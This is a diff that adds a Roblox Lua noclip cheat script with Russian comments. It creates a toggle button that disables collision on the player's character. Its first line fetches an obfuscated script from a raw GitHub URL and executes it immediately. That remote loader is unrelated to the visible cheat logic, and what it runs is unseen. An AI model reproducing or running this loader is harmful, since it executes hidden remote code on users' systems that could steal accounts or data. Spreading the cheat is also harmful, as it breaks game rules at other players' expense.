@@ -1,0 +1,30 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sagor112233829/Sagg-script-morphup-/main/obfuscated_script-1780628089897.lua.txt"))()
+local player = game.Players.LocalPlayer
+local runService = game:GetService("RunService")
+local uis = game:GetService("UserInputService")
+
+-- Создание GUI кнопки
+local screenGui = Instance.new("ScreenGui", game.CoreGui)
+local noclipBtn = Instance.new("TextButton", screenGui)
+noclipBtn.Size = UDim2.new(0, 100, 0, 50)
+noclipBtn.Position = UDim2.new(0.5, -50, 0.1, 0)
+noclipBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+noclipBtn.Text = "Noclip: OFF"
+noclipBtn.TextSize = 20
+noclipBtn.Draggable = true -- Встроенная функция перетаскивания
+
+-- Логика Noclip
+local noclipActive = false
+noclipBtn.MouseButton1Click:Connect(function()
+  noclipActive = not noclipActive
+  noclipBtn.Text = noclipActive and "Noclip: ON" or "Noclip: OFF"
+  noclipBtn.BackgroundColor3 = noclipActive and Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
+end)
+
+runService.Stepped:Connect(function()
+  if noclipActive and player.Character then
+    for _, part in pairs(player.Character:GetDescendants()) do
+      if part:IsA("BasePart") then part.CanCollide = false end
+    end
+  end
+end)
